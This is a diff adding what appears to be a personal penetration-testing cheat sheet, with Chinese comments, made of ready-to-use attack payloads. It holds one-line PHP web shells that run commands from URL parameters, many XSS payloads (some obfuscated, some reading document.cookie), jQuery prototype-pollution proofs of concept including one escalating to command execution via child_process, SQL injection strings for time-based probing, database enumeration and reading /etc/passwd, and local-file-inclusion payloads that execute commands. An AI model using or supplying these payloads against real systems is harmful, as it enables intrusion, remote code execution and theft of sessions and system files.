@@ -1,0 +1,111 @@
+# ascii
+print(*[ord(i) for i in input('str:')], sep='')
+
+# hex
+print(*[hex(ord(i))[2:] for i in input('str:')], sep='')
+
+
+# sqlmap
+--csrf-token='__EVENTVALIDATION' --eval='__VIEWSTATE=__VIEWSTATE.replace("\\","")'
+
+
+# webshell
+<?=`$_GET[0]`;;?>
+<?php function r($a){eval($a);}r($_GET[1]);?>
+
+
+# xss
+//  alert(1)
+eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+
+//  alert(document.cookie)
+eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))
+
+<h1><ceNteR onmouseover=alert(1) style="background-color:black;color:green;font-size:50px;">hack by D1stance</CenTer></h1>
+
+<a+href%3Djavascript:alert(document.cookie)>+[+點我A_A+]+<%2Fa>
+
+
+"><sCrIpt>alert(1)</scRipT>
+"><ceNteR><h1>XSS test</h1></CenTer>
+"><h1>1</h1>
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+" onload=$.extend(true,{},JSON.parse('{"__proto__":{"z":"xss"}}'));alert(z)
+" onmouseover=alert(document.cookie)><"
+" onload=alert(document.cookie)><"
+" onmouseover=$.extend(true,{},JSON.parse('{"__proto__":{"z":"xss"}}'));alert(z);><"
+" onerror=alert(1)//
+"><svg/onload=$.extend(true,{},JSON.parse('{"__proto__":{"z":123}}'));alert(z)>
+
+onscroll=alert(26)
+"><sCr<sCrIpt>Ipt>alert(1)</sc<sCrIpt>RipT>
+
+"><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+"><IMG SRC=JaVaScRiPt:alert(1)>
+"><IMG SRC=jav ascript:alert(1)>
+
+<video src=x onerror=prompt(1)>
+<audio src=x onerror=prompt(1)>
+<q/oncut=alert(1)>
+\x3c img src onerror=alert(1) \x3e
+
+<div style=color:expression(confirm(1))>
+"><div style="color: expression(alert(1))">
+
+<svg><script>alert&#40/1/&#41</script> // 通杀所有浏览器
+
+"><BR SIZE="&*{alert('XSS')}">
+"><BR SIZE=&{alert(1)}>
+
+
+# printenv.pl的XSS payload
+http://[target]/cgi-bin/printenv/href="bad"
+http://[target]/cgi-bin/printenv.pl?acuparam=>"><ScRiPt>alert(1)</ScRiPt>
+
+# 原形污染PoC
+// jquery 3.4.0版本以前都有效
+$.extend(true, {}, JSON.parse('{"__proto__": {"z": 123}}'));console.log(z);
+
+# 原形污染 to RCE
+{"z":"return global.process.mainModule.constructor._load('child_process').execSync('ls');}
+
+
+# XSS + 原形污染PoC
+"><script>eval(String.fromCharCode(36,46,101,120,116,101,110,100,40,116,114,117,101,44,123,125,44,74,83,79,78,46,112,97,114,115,101,40,39,123,34,95,95,112,114,111,116,111,95,95,34,58,123,34,122,34,58,49,50,51,125,125,39,41,41,59,97,108,101,114,116,40,122,41,59))</script>
+"><script>$.extend(true,{},JSON.parse('{"__proto__":{"z":123}}'));alert(z);</script>
+"><script>$.extend(true,{},JSON.parse('{"__proto__":{"z":"xss"}}'));alert(z);</script>
+
+
+# SQLi
+' or 1 or '
+' or sleep(10)-- -
+';WAITFOR DELAY '0:0:10'-- -
+(select count(*) from mysql.user)>0
+load_file('/etc/passwd')
+load_file(char(47,101,116,99,47,112,97,115,115,119,100))
+load_file(0x2f6574632f706173737764)
+
+
+# sql injection
+999%aa' union select 1,2 %23
+1%df%27--
+char(0x27)
+union select group_concat(table_name,char(32)) from information _schema.tables where table__schema=database()
+-- mysql table
+SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(table_name,0x20) from information_schema.tables where database()='northwind'
+
+-- mysql db
+SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(schema_name,0x20) from information_schema.schemata
+-- mysql column
+SELECT * FROM Customers where CustomerID=1 and 1=0 union select 1,2,3,4,5,6,group_concat(column_name,0x20) from information_schema.columns where database()='northwind'
+
+-- time based
+' AND (SELECT 7902 FROM (SELECT(SLEEP(10)))BGsz) AND 'SXim'='SXim
+
+
+
+# LFI
+page=file:///etc/passwd
+page=php://input&cmd=ls
+page=php://filter/read=convert.base64-encode/resource=index.php
+page=expect://ls
